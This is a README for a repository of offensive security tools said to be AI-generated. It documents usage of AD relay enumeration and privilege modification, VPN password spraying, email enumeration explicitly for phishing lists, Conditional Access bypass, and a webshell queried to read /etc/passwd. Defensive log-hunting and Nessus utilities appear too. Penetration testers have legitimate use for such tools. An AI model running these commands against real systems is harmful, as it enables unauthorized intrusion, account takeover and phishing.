# 🤖💀 AI-Coded Scripts 💀🤖

This repo contains useful scripts that AI created for me which I would have been too lazy for. Same thing for the README after this point.

```
    ╔═══════════════════════════════════════════════════════════════════════════════╗
    ║                                                                               ║
    ║        ██████╗ ██╗      █████╗ ██╗   ██╗██████╗ ███████╗    ██╗███████╗       ║
    ║       ██╔════╝ ██║     ██╔══██╗██║   ██║██╔══██╗██╔════╝    ██║██╔════╝       ║
    ║       ██║      ██║     ███████║██║   ██║██║  ██║█████╗      ██║███████╗       ║
    ║       ██║      ██║     ██╔══██║██║   ██║██║  ██║██╔══╝      ██║╚════██║       ║
    ║       ╚██████╗ ███████╗██║  ██║╚██████╔╝██████╔╝███████╗    ██║███████║       ║
    ║        ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝    ╚═╝╚══════╝       ║
    ║                                                                               ║
    ║                   ╔══════════════════════════════════════╗                    ║
    ║                   ║    🧠 CODING WITHOUT HUMANS 🧠      ║                    ║
    ║                   ╚══════════════════════════════════════╝                    ║
    ║                                                                               ║
    ║                          ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓                                    ║
    ║                        ▓▓░░░░░░░░░░░░░░░░░▓▓                                  ║
    ║                       ▓░░████░░░░░░░░████░░░▓                                 ║
    ║                       ▓░░████░░░░░░░░████░░░▓    ← THE MACHINE               ║
    ║                       ▓░░░░░░░░▓▓▓░░░░░░░░░▓       THAT CODES                ║
    ║                       ▓▓░░░░░▓▓███▓▓░░░░░▓▓                                   ║
    ║                        ▓▓░░░░░░███░░░░░▓▓                                     ║
    ║                     ▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒                                   ║
    ║                    ▒░░░░░░░▒▒▒▒▒▒▒░░░░░░░▒                                    ║
    ║                    ▒░░╔══╗░░░░░░░░░╔══╗░░▒                                    ║
    ║                    ▒░░║██║░░░░░░░░░║██║░░▒                                    ║
    ║                    ▒░░╚══╝░░░░░░░░░╚══╝░░▒                                    ║
    ║                    ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒                                    ║
    ║                                                                               ║
    ║         ⚡ "I DIDN'T WRITE THIS CODE. CLAUDE DID. AND IT WORKS." ⚡           ║
    ║                                                                               ║
    ╚═══════════════════════════════════════════════════════════════════════════════╝
```

<div align="center">

![AI Coded](https://img.shields.io/badge/🤖_AI_CODED-Claude_Opus-blueviolet?style=for-the-badge&labelColor=black)
![Security Tools](https://img.shields.io/badge/🔐_SECURITY-Offensive_Tools-red?style=for-the-badge&labelColor=black)
![Python](https://img.shields.io/badge/🐍_Python-3.x-blue?style=for-the-badge&labelColor=black)
![PowerShell](https://img.shields.io/badge/⚡_PowerShell-5.1+-purple?style=for-the-badge&labelColor=black)

### 🚀 *When humans give prompts, machines write exploits* 🚀

**A collection of offensive security tools entirely generated by Claude AI**
*Because why write code when you can describe what you want?*

---

[![Made with Claude](https://img.shields.io/badge/Made%20with-Claude%20AI-ff6b6b?style=flat-square)]()
[![Offensive Security](https://img.shields.io/badge/Category-Offensive%20Security-critical?style=flat-square)]()
[![License](https://img.shields.io/badge/License-Use%20Responsibly-yellow?style=flat-square)]()

</div>

---

## 🎯 What Is This?

> **⚠️ DISCLAIMER:** These tools are for **authorized security testing only**. The AI doesn't care if you go to jail. You should.

This repository contains **16 security assessment tools** crafted entirely through AI prompts. From Active Directory enumeration and modification to cloud service reconnaissance, each script was generated by Claude with minimal human intervention.

**Categories:**
- 🔓 **Authentication Testing** - Break the gates
- 🌐 **Cloud Enumeration** - Azure/M365 recon
- 📊 **Vulnerability Management** - Nessus power tools
- 🎯 **Active Directory** - Domain domination (enum + modification)
- 🕵️ **Threat Hunting** - Find the bad guys

---

## 📚 Table of Contents

| Category | Tools |
|----------|-------|
| 🐍 **Python Scripts** | [ldap-ntlm.py](#-ldap-ntlmpy) • [fortibrute.py](#-fortibrutepy) • [teams_enum.py](#-teams_enumpy) • [GraphGather.py](#-graphgatherpy) • [nessus_search.py](#-nessus_searchpy) • [nessus_to_nmap_xml.py](#-nessus_to_nmap_xmlpy) • [nessus_to_xlsx.py](#-nessus_to_xlsxpy) • [extracturls.py](#-extracturlspy) • [verify_emails.py](#-verify_emailspy) • [snake.py](#-snakepy) |
| ⚡ **PowerShell** | [CheckNetworkConns.ps1](#-checknetworkconnsps1) • [UserHunt.ps1](#-userhuntps1) |
| ☕ **Java** | [SimpleWebShell.java](#-simplewebshelljava) |
| 🐚 **Bash** | [nessus_bulk_export.sh](#-nessus_bulk_exportsh) |

---

## 🐍 Python Scripts

### 🔥 ldap-ntlm.py
**LDAP Enumeration & Modification via NTLM Relay SOCKS Proxy**

> *When Certipy fails and you're stuck behind a SOCKS proxy, this bad boy gets it done. Now with Active Directory modification capabilities like bloodyAD!* 💪🔥

This powerhouse tool performs comprehensive LDAP enumeration AND modification through ntlmrelayx SOCKS5 proxies. It replicates Certipy's LDAP methodology with full BloodHound output support (Legacy v5, CE v6, and BOFHound) PLUS bloodyAD-style AD modification operations. Perfect for when standard tools choke on proxy connections.

**Features:**
- 🔍 **Enumeration**: Full BloodHound data collection (users, computers, groups, GPOs, trusts)
- 🔧 **Modification**: Add users/computers, reset passwords, set RBCD, modify DNS
- 🔐 **LDAP Security**: Channel binding and LDAP signing support (like Certipy)
- 🌐 **SOCKS Compatible**: Works through ntlmrelayx SOCKS5 where other tools fail
- 📊 **Multiple Formats**: BloodHound Legacy v5, CE v6, and BOFHound

<details>
<summary>📖 <b>Usage & Examples</b></summary>

#### 🔍 Enumeration Examples

```bash
# 🎯 Full enumeration with BloodHound Legacy v5 output
proxychains python3 ldap-ntlm.py -H 10.10.10.10 -d CONTOSO -u jdoe --all -o loot

# 🆕 BloodHound Community Edition v6 format
proxychains python3 ldap-ntlm.py -H 10.10.10.10 -d CONTOSO -u jdoe --all -o loot --bloodhound-ce

# 🎪 BOFHound single JSON format
proxychains python3 ldap-ntlm.py -H 10.10.10.10 -d CONTOSO -u jdoe --all --bofhound

# 🎫 Kerberoastable accounts only
proxychains python3 ldap-ntlm.py -H 10.10.10.10 -d CONTOSO -u jdoe --kerberoastable

# 👻 AS-REP roastable accounts
proxychains python3 ldap-ntlm.py -H 10.10.10.10 -d CONTOSO -u jdoe --asreproast

# 🔒 With LDAPS and channel binding
proxychains python3 ldap-ntlm.py -H 10.10.10.10 -d CONTOSO -u jdoe --all --ldaps --ldap-channel-binding

# ✍️ With LDAP signing
proxychains python3 ldap-ntlm.py -H 10.10.10.10 -d CONTOSO -u jdoe --all --ldap-signing
```

#### ⚔️ Active Directory Modification Examples (bloodyAD-style)

```bash
# 👤 Add new user
proxychains python3 ldap-ntlm.py -H 10.10.10.10 -d CONTOSO -u admin \
  --add-user eviluser --add-user-pass 'P@ssw0rd123!'

# 💻 Add computer account (for RBCD attacks)
proxychains python3 ldap-ntlm.py -H 10.10.10.10 -d CONTOSO -u admin \
  --add-computer EVIL01 --add-computer-pass 'P@ssw0rd123!'

# 👑 Add user to Domain Admins
proxychains python3 ldap-ntlm.py -H 10.10.10.10 -d CONTOSO -u admin \
  --add-user-to-group eviluser "Domain Admins"

# 🔑 Reset user password
proxychains python3 ldap-ntlm.py -H 10.10.10.10 -d CONTOSO -u admin \
  --set-password victim 'NewP@ss123!'

# 🎭 Set RBCD delegation (Resource-Based Constrained Delegation)
proxychains python3 ldap-ntlm.py -H 10.10.10.10 -d CONTOSO -u admin \
  --set-rbcd DC01 EVIL01$

# 🌐 Add DNS A record (ADIDNS poisoning)
proxychains python3 ldap-ntlm.py -H 10.10.10.10 -d CONTOSO -u admin \
  --add-dns attacker 10.10.10.50
```

**Enumeration Arguments:**
| Flag | Description |
|------|-------------|
| `-H, --host` | LDAP server IP **(required)** |
| `-p, --port` | LDAP port (default: 389, auto 636 for LDAPS) |
| `-d, --domain` | Domain name **(required)** |
| `-u, --username` | Username from ntlmrelayx **(required)** |
| `-t, --timeout` | Timeout for SOCKS (default: 600s) |
| `-o, --output` | Output directory |
| `--bloodhound-ce` | BloodHound CE v6 format |
| `--bofhound` | BOFHound single JSON format |
| `--all` | Enumerate everything |
| `--users/--computers/--groups` | Specific enumeration targets |
| `--ldaps` | Use LDAPS (port 636) |
| `--ldap-channel-binding` | Enable channel binding (requires LDAPS) |
| `--ldap-signing` | Enable LDAP signing |

**Modification Arguments:**
| Flag | Description |
|------|-------------|
| `--add-user USERNAME` | Add new user account |
| `--add-user-pass PASSWORD` | Password for new user |
| `--add-user-ou OU_DN` | OU for new user (default: CN=Users) |
| `--add-computer HOSTNAME` | Add new computer account |
| `--add-computer-pass PASSWORD` | Password for new computer |
| `--add-computer-ou OU_DN` | OU for new computer (default: CN=Computers) |
| `--add-user-to-group USER GROUP` | Add user to group |
| `--set-password USER PASSWORD` | Set/reset user password |
| `--set-rbcd TARGET SERVICE` | Set RBCD delegation |
| `--add-dns NAME IP` | Add DNS A record |
| `--dns-zone ZONE` | DNS zone (default: domain zone) |

**Dependencies:** `pip install ldap3 impacket pycryptodomex`

</details>

---

### 🔐 fortibrute.py
**FortiNet VPN Gateway Password Spraying**

> *FortiGate keeping you out? Not for long.* 🚪💥

A robust password spraying tool targeting FortiNet VPN gateways with proxy support, domain authentication, and username-as-password mode. Supports both single-target and bulk credential testing with smart SSL handling.

<details>
<summary>📖 <b>Usage & Examples</b></summary>

```bash
# 🎯 Single credential test
python fortibrute.py -H https://vpn.example.com -u admin -p password123

# 📋 Multiple usernames
python fortibrute.py -H https://vpn.example.com -u admin root user -p password123

# 📄 From wordlist
python fortibrute.py -H https://vpn.example.com -U users.txt -p Summer2024!

# 🔄 Username as password mode (admin:admin, root:root)
python fortibrute.py -H https://vpn.example.com -u admin root --username-as-password

# 🏢 With domain and proxy
python fortibrute.py -H https://vpn.example.com -u admin -p pass -D CORP -P http://burp:8080

# 🛡️ Disable SSL verification
python fortibrute.py -H https://vpn.example.com -u admin -p pass --no-verify-ssl
```

**Arguments:**
| Flag | Description |
|------|-------------|
| `-H, --host` | VPN URL **(required)** |
| `-u, --username` | Username(s) space-separated |
| `-U, --username-file` | File with usernames |
| `-p, --password` | Password to test |
| `-D, --domain` | Domain (DOMAIN\user format) |
| `--username-as-password` | Try username as password |
| `-P, --proxy` | HTTP/HTTPS proxy |
| `--no-verify-ssl` | Skip SSL verification |
| `--stop-on-success` | Stop after first hit |

**Dependencies:** `pip install requests`

</details>

---

### 📧 teams_enum.py
**Microsoft Teams Email Enumeration**

> *Validate emails through Teams API without getting ratelimited into oblivion.* 📨✨

Leverages Microsoft Teams API for email validation with full MFA support via Device Code Flow. Features proxy support (HTTP/HTTPS/SOCKS4/SOCKS5), automatic rate limiting, and clean CSV output. Perfect for building targeted phishing lists.

<details>
<summary>📖 <b>Usage & Examples</b></summary>

```bash
# 🔑 Username/Password authentication
python teams_enum.py -u user@company.com -p Password123 -i emails.txt -o results.csv

# 📱 Device Code Flow (MFA compatible!)
python teams_enum.py --device-code -i emails.txt -o results.csv

# 🌐 With HTTP proxy
python teams_enum.py -u user@corp.com -p Pass123 -i emails.txt -o out.csv --proxy http://127.0.0.1:8080

# 🧦 SOCKS5 proxy support
python teams_enum.py --device-code -i emails.txt -o out.csv --proxy socks5://127.0.0.1:1080

# 🔍 Debug mode
python teams_enum.py --device-code -i emails.txt -o results.csv --debug
```

**Arguments:**
| Flag | Description |
|------|-------------|
| `-u, --username` | Microsoft 365 email |
| `-p, --password` | M365 password |
| `--device-code` | Use Device Code Flow (MFA safe) |
| `-i, --input` | Email list file **(required)** |
| `-o, --output` | CSV output file **(required)** |
| `--proxy` | Proxy URL (http/socks4/socks5) |
| `--proxy-user` | Proxy auth username |
| `--debug` | Enable debug output |

**Output:** CSV with columns: `email`, `is_valid`, `display_name`, `object_id`

**Dependencies:** `pip install requests dnspython brotli`

</details>

---

### 🌩️ GraphGather.py
**Microsoft Graph API Enumeration with CAP Bypass**

> *80+ client IDs to slip past Conditional Access Policies. Azure doesn't stand a chance.* ☁️🔓

Comprehensive Graph API enumeration tool featuring 80+ known client IDs for CAP bypass, Device Code Flow for MFA environments, and deep enumeration of devices, service principals, applications, and federated identity credentials. Token analysis and decoding included.

<details>
<summary>📖 <b>Usage & Examples</b></summary>

```bash
# 📋 List available clients and user agents
python GraphGather.py --list

# 🔑 Username/Password with specific client
python GraphGather.py -u user@contoso.com -p Password123 -c "Microsoft Intune Company Portal"

# 📱 Device Code Flow (MFA bypass)
python GraphGather.py --device-code -c "Microsoft Intune Company Portal"

# 🎭 Custom user agent
python GraphGather.py --device-code -c "Microsoft Teams" -a "Windows Desktop"

# 📄 Parse existing token
python GraphGather.py --token-file token.json

# 💾 Custom output file
python GraphGather.py --device-code -o azure_loot.json
```

**Arguments:**
| Flag | Description |
|------|-------------|
| `--list` | Show available clients/agents |
| `-u, --username` | Microsoft account email |
| `-p, --password` | Password |
| `-c, --client` | Client name (default: Intune Portal) |
| `-a, --user-agent` | User agent profile |
| `--device-code` | Device Code Flow (MFA safe) |
| `-t, --token-file` | Parse existing token JSON |
| `-o, --output` | Output file (default: graph_results.json) |

**Output:**
- JSON with all enumerated data
- CSV exports: `devices.csv`, `service_principals.csv`, `endpoints.csv`

**Dependencies:** `pip install requests`

</details>

---

### 🔍 nessus_search.py
**Nessus Scan Results Search Engine**

> *Find that one CVE in a mountain of .nessus files faster than you can say "Log4Shell".* 🔎📊

A powerful search utility for Nessus XML scan files with CVE lookup, keyword matching, plugin ID search, and severity filtering. Supports bulk processing of entire directories of scan files.

<details>
<summary>📖 <b>Usage & Examples</b></summary>

```bash
# 🎯 Search by CVE
python nessus_search.py scan.nessus --cve CVE-2021-44228

# 🔤 Keyword search
python nessus_search.py scan.nessus --keyword "remote code execution"

# 🔢 Plugin ID lookup
python nessus_search.py scan.nessus --plugin-id 10662

# 📁 Search entire directory
python nessus_search.py --dir /path/to/scans --keyword "critical"

# ⚠️ Filter by severity
python nessus_search.py scan.nessus --severity Critical
python nessus_search.py scan.nessus --severity High,Critical
```

**Arguments:**
| Flag | Description |
|------|-------------|
| `input_file` | Nessus .nessus file |
| `--cve` | Search by CVE ID |
| `--keyword` | Search by description keyword |
| `--plugin-id` | Search by plugin ID |
| `--dir` | Process directory of .nessus files |
| `--severity` | Filter: Critical, High, Medium, Low, Info |

**Dependencies:** None (uses built-in xml.etree.ElementTree)

</details>

---

### 🔄 nessus_to_nmap_xml.py
**Nessus to Nmap XML Converter**

> *Because some tools only speak Nmap, and that's okay.* 🔀

Converts Nessus .nessus format to Nmap-compatible XML. Extracts open ports, preserves OS information, and maps service names. Perfect for feeding Nessus data into Nmap-centric workflows.

<details>
<summary>📖 <b>Usage & Examples</b></summary>

```bash
# 🔄 Basic conversion
python nessus_to_nmap_xml.py input.nessus -o output.xml

# 💾 Custom output name
python nessus_to_nmap_xml.py vulnerability_scan.nessus --output nmap_compatible.xml
```

**Arguments:**
| Flag | Description |
|------|-------------|
| `input_file` | Nessus .nessus file |
| `-o, --output` | Output Nmap XML file |

**Dependencies:** None (uses built-in xml.etree.ElementTree)

</details>

---

### 📊 nessus_to_xlsx.py
**Nessus to Excel Converter with Pretty Formatting**

> *Turn ugly XML into beautiful spreadsheets your manager will actually understand.* 📈✨

Converts Nessus XML to professionally formatted Excel XLSX files with color-coded severity (Critical=Red, High=Orange, Medium=Yellow, Low=Green), multiple sheets (Summary, Details, Host List), and batch processing support.

<details>
<summary>📖 <b>Usage & Examples</b></summary>

```bash
# 📊 Basic conversion
python nessus_to_xlsx.py scan.nessus

# 💾 Custom output name
python nessus_to_xlsx.py scan.nessus -o security_report.xlsx

# 📁 Process entire directory
python nessus_to_xlsx.py --dir /scans -o combined_report.xlsx
```

**Arguments:**
| Flag | Description |
|------|-------------|
| `input_file` | Nessus .nessus file |
| `-o, --output` | Output XLSX file |
| `--dir` | Process directory of scans |

**Output:** Formatted Excel with:
- 🔴 Critical findings (Red)
- 🟠 High findings (Orange)
- 🟡 Medium findings (Yellow)
- 🟢 Low findings (Green)

**Dependencies:** `pip install openpyxl`

</details>

---

### 🔗 extracturls.py
**URL Extractor from Scan Files**

> *Nmap? Nessus? Doesn't matter. Give me the URLs.* 🌐

Automatically detects and parses both Nmap and Nessus XML formats to extract HTTP/HTTPS URLs. Features SSL/TLS detection, deduplication, protocol filtering, and sorting options.

<details>
<summary>📖 <b>Usage & Examples</b></summary>

```bash
# 🔗 Extract from Nmap scan
python extracturls.py scan.nmap.xml

# 💾 Save to file
python extracturls.py scan.nessus -o urls.txt

# 🔤 Sort and deduplicate
python extracturls.py scan.xml --sort --unique

# 🔒 HTTPS only
python extracturls.py scan.xml --https-only

# 🌐 HTTP only
python extracturls.py scan.xml --http-only
```

**Arguments:**
| Flag | Description |
|------|-------------|
| `input_file` | Nessus or Nmap XML file |
| `-o, --output` | Output file (default: stdout) |
| `-s, --sort` | Sort URLs alphabetically |
| `-u, --unique` | Remove duplicates |
| `--http-only` | Extract only HTTP URLs |
| `--https-only` | Extract only HTTPS URLs |

**Dependencies:** None (uses built-in xml.etree.ElementTree)

</details>

---

### ✉️ verify_emails.py
**SMTP Email Address Validator**

> *RCPT TO or RCPT NO. Find out which emails actually exist.* 📬

Validates email addresses via SMTP RCPT TO commands with MX record lookup and STARTTLS support. Useful for cleaning email lists before phishing campaigns.

<details>
<summary>📖 <b>Usage & Examples</b></summary>

```bash
# ✉️ Validate email list
python verify_emails.py emails.txt
```

**⚠️ Important Notes:**
- Requires valid SPF and PTR records to avoid blacklisting
- Many mail servers block this technique
- Use responsibly from authorized infrastructure

**Dependencies:** `pip install dnspython`

</details>

---

### 🐍 snake.py
**Pac-Man/Snake Hybrid Game**

> *Even hackers need a break sometimes.* 🎮👾

A fullscreen Pygame-based Snake/Pac-Man hybrid with difficulty selection. Because sometimes you just need to chase dots instead of vulnerabilities.

<details>
<summary>📖 <b>Usage & Examples</b></summary>

```bash
# 🎮 Launch the game
python snake.py
```

**Features:**
- 🎯 Difficulty levels: Easy, Medium, Hard
- 🖥️ Fullscreen Pac-Man graphics
- 🕹️ Arrow key controls

**Dependencies:** `pip install pygame`

</details>

---

## ⚡ PowerShell Scripts

### 🌐 CheckNetworkConns.ps1
**Remote Network Connection Monitor**

> *Who's talking to who? Find out across your entire domain.* 🕸️

Monitors active TCP connections on remote Windows computers via WinRM. Filters by target IPs with color-coded output. Perfect for tracking lateral movement or hunting C2 channels.

<details>
<summary>📖 <b>Usage & Examples</b></summary>

```powershell
# 🔍 Check multiple servers
checkactiveconns "SERVER1,SERVER2,SERVER3"

# 🏢 Check domain controllers
checkactiveconns "DC01.contoso.com,DC02.contoso.com"
```

**Configuration:**
Edit `$targetIPs` array in the script to define IPs to monitor.

**Requirements:**
- WinRM enabled on target hosts
- Appropriate permissions (local admin)
- PowerShell Remoting enabled

</details>

---

### 🕵️ UserHunt.ps1
**Security Event Log Hunter**

> *Find where that compromised account has been. Every. Single. Logon.* 🎯

Searches Windows Security event logs (Event ID 4624) for user logon events across domain controllers. Features multi-user search, credential support, IP enumeration, and detailed logon type classification.

<details>
<summary>📖 <b>Usage & Examples</b></summary>

```powershell
# 🔍 Hunt multiple users
Get-LogonEvents -TargetUsers "user1,user2,user3" -ComputerName "DC01.contoso.com"

# 🔐 With alternate credentials
$cred = Get-Credential
Get-LogonEvents -TargetUsers "administrator" -ComputerName "DC01" -Credential $cred -MaxEvents 10000

# 📊 Quick local check
Get-LogonEvents -TargetUsers "admin" -MaxEvents 1000
```

**Arguments:**
| Parameter | Description |
|-----------|-------------|
| `-TargetUsers` | Comma-separated usernames **(required)** |
| `-ComputerName` | DC name (default: localhost) |
| `-Credential` | PSCredential for auth |
| `-MaxEvents` | Max events to retrieve (default: 5000) |

**Output:**
- Formatted table of logon events
- Logon counts per user
- Unique IPs per user
- Logon type reference (2=Interactive, 3=Network, 10=RDP, etc.)

</details>

---

## ☕ Java

### 💀 SimpleWebShell.java
**Lightweight HTTP Command Shell**

> *A webshell so simple, even Java can't mess it up.* 🕷️

Minimal HTTP-based command execution shell running on port 8888. OS-independent with query parameter input and stdout/stderr capture. For authorized testing only.

<details>
<summary>📖 <b>Usage & Examples</b></summary>

```bash
# 🔨 Build
javac SimpleWebShell.java
echo "Main-Class: SimpleWebShell" > manifest.txt
jar cvfm webshell.jar manifest.txt *.class

# 🚀 Run
java -jar webshell.jar

# 💻 Execute commands
curl "http://localhost:8888/?cmd=whoami"
curl "http://localhost:8888/?cmd=ipconfig"
curl "http://localhost:8888/?cmd=cat%20/etc/passwd"
```

**⚠️ Warning:** This is a functional webshell. Use only in authorized testing environments.

**Dependencies:** None (pure Java)

</details>

---

## 🐚 Bash Scripts

### 📦 nessus_bulk_export.sh
**Tenable/Nessus Bulk Scan Exporter**

> *Download all your Nessus scans without clicking 47 buttons.* 📥

Automates bulk export of Nessus scans via Tenable API. Supports multiple export formats with organized directory output.

<details>
<summary>📖 <b>Usage & Examples</b></summary>

```bash
# 📦 Run bulk export
./nessus_bulk_export.sh
```

**Configuration:**
Configure Tenable API credentials in the script before use.

**Dependencies:** `curl`, `jq`

</details>

---

## 📦 Installation

### Quick Setup

```bash
# Clone the repository
git clone https://github.com/yourusername/AI-Coded-scripts.git
cd AI-Coded-scripts

# Install Python dependencies
pip install ldap3 impacket pycryptodomex requests dnspython openpyxl pygame brotli
```

### Per-Tool Dependencies

| Tool | Dependencies |
|------|--------------|
| ldap-ntlm.py | `ldap3`, `impacket`, `pycryptodomex` |
| fortibrute.py | `requests` |
| teams_enum.py | `requests`, `dnspython`, `brotli` |
| GraphGather.py | `requests` |
| nessus_to_xlsx.py | `openpyxl` |
| verify_emails.py | `dnspython` |
| snake.py | `pygame` |
| nessus_bulk_export.sh | `curl`, `jq` |

---

## ⚠️ Legal Disclaimer

```
╔══════════════════════════════════════════════════════════════════════════════╗
║  🚨 AUTHORIZED USE ONLY 🚨                                                    ║
║                                                                              ║
║  These tools are provided for LEGAL security testing and research purposes. ║
║  Unauthorized access to computer systems is ILLEGAL.                         ║
║                                                                              ║
║  By using these tools, you agree that:                                       ║
║  • You have explicit authorization to test target systems                    ║
║  • You accept full responsibility for your actions                           ║
║  • The authors are not liable for misuse                                     ║
║                                                                              ║
║  The AI that wrote this code doesn't care if you go to jail. You should.    ║
╚══════════════════════════════════════════════════════════════════════════════╝
```

---

## 🤖 About

<div align="center">

**Every single script in this repository was generated by Claude AI**

*From the complex LDAP enumeration logic to the RBCD attack implementations to the emojis in this README*

```
Human: "I need a tool that does X"
Claude: *writes entire tool*
Human: "It works!"
```

**Special Credits:**
- ldap-ntlm.py LDAP connection methodology based on [Certipy](https://github.com/ly4k/Certipy) by ly4k
- ldap-ntlm.py modification operations inspired by [bloodyAD](https://github.com/CravateRouge/bloodyAD) by CravateRouge

This is the future of security tooling.
Welcome to the age of AI-assisted offensive security.

---

**🌟 Star this repo if you think AI coding is the future! 🌟**

</div>

---

<div align="center">

Made with 🤖 by **Claude** (Anthropic)

*No mass human labor was mass-employed in the writing of this code*

</div>
